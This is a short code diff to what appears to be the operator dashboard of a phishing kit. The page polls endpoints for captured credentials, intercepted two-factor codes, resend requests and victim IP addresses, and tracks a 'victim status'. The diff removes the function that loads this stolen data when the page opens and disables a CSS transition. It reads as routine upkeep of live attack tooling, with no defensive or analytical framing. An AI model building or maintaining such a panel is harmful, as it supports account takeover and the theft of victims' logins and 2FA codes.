@@ -186,7 +186,7 @@
             opacity: 0.7;
         }
         
-        .glass-panel { transition: opacity 0.2s ease; }
+        .glass-panel { transition: none; }
         
         .theme-toggle {
             background: var(--glass-bg);
@@ -953,24 +953,6 @@
         let lastResendLength = 0;
         let lastVictimStatus = '';
         let lastIpsLength = 0;
-        
-        async function loadInitialData() {
-            const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
-                fetch('/api/get-creds'),
-                fetch('/api/get-2fa'),
-                fetch('/api/get-resend-requests'),
-                fetch('/api/get-state'),
-                fetch('/api/get-ips')
-            ]);
-            const creds = await credsRes.json();
-            const codes = await codesRes.json();
-            const resends = await resendRes.json();
-            const state = await stateRes.json();
-            const ips = await ipsRes.json();
-            renderAll(creds, codes, resends, state, ips);
-        }
-        
-        loadInitialData();
         
         setInterval(async () => {
             const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
